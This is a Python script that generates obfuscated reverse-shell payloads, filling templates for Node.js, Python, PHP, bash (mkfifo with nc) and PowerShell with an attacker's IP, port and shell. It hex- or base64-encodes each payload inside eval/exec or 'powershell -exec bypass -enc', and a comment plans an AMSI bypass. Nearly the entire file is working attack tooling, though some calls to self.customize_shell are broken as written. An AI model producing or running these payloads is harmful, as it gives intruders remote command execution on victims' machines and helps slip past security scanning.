import sys
import binascii
import base64

def customize_shell(base_shell, ip, cmd, port, lang):
    custom_shell = base_shell.replace("$$ip$$", ip)
    custom_shell = custom_shell.replace("$$cmd$$", cmd)
    custom_shell = custom_shell.replace("$$port$$", port)
    if lang == "node" or lang == "python2" or lang == "python3":
        custom_shell = binascii.hexlify(custom_shell)
    elif lang == "php" or lang == "bash":
        custom_shell_bytes = custom_shell.encode('ascii')
        custom_shell = base64.b64encode(custom_shell_bytes)
    elif lang == "powershell":
        #encoding from here: https://byt3bl33d3r.github.io/converting-commands-to-powershell-compatible-encoded-strings-for-dummies.html
        custom_shell_bytes = custom_shell.encode('UTF-16LE')
        custom_shell = base64.b64encode(custom_shell_bytes)#encode('UTF-16LE')
    else:
        print("unsupported language")
        exit()
    return custom_shell

def node(ip, port, cmd):
    
    #original shell from here: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
    base_shell = """(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("$$cmd$$", []);
    var client = new net.Socket();
    client.connect($$port$$, "$$ip$$", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();"""
    custom_shell = self.customize_shell(base_shell, ip, cmd, port, "node")
    payload = "eval(new Buffer('{}', 'hex').toString());".format(custom_shell)
    return payload

def python(ip, port, cmd, version):
    #original shell from here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
    base_shell = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$$ip$$\",$$port$$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"$$cmd$$\")"
    custom_shell = self.customize_shell(base_shell, ip, cmd, port, version)

    if version == "python2":
        payload = "import codecs; exec(codecs.decode('{}','hex'))".format(custom_shell)
    else:
        payload = "import binascii; exec(binascii.unhexlify('{}'))".format(custom_shell)
    return payload

def php(ip, port, cmd):
    #original shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
    base_shell = "$sock=fsockopen(\"$$ip$$\",$$port$$);exec(\"$$cmd$$ -i <&3 >&3 2>&3\");"
    custom_shell = self.customize_shell(base_shell, ip, cmd, port, "php")
    payload = "eval(base64_decode('{}'));".format(custom_shell)
    return payload

def bash(ip, port, cmd):
    #original shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd
    base_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$$cmd$$ -i 2>&1|nc $$ip$$ $$port$$ >/tmp/f"
    custom_shell = self.customize_shell(base_shell, ip, cmd, port, "bash")
    payload = "echo {} | base64 -d | sh".format(custom_shell)
    return payload


def powershell(ip, port):
    #TODO: bypass AMSI
    #original shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
    base_shell = "$client = New-Object System.Net.Sockets.TCPClient('$$ip$$',$$port$$);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    custom_shell = self.customize_shell(base_shell, ip, "", port, "powershell")
    payload = "powershell.exe -exec bypass -enc  {}".format(custom_shell)
    return payload


def main():
    if len(sys.argv) == 5:
        ip = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]
        shell = sys.argv[4]
        
        if shell == "node":
            payload = node(ip, port, cmd)
        elif shell == "python2" or shell == "python3":
            version = shell
            payload = python(ip, port, cmd, version)
        elif shell == "php":
            payload = php(ip, port, cmd)
        elif shell == "bash":
            payload = bash(ip, port, cmd)
        elif shell == "powershell":
            payload = powershell(ip, port)
        else:
            print("language not supported")
            exit()
        
        print(payload)

if __name__ == "__main__":
    main()
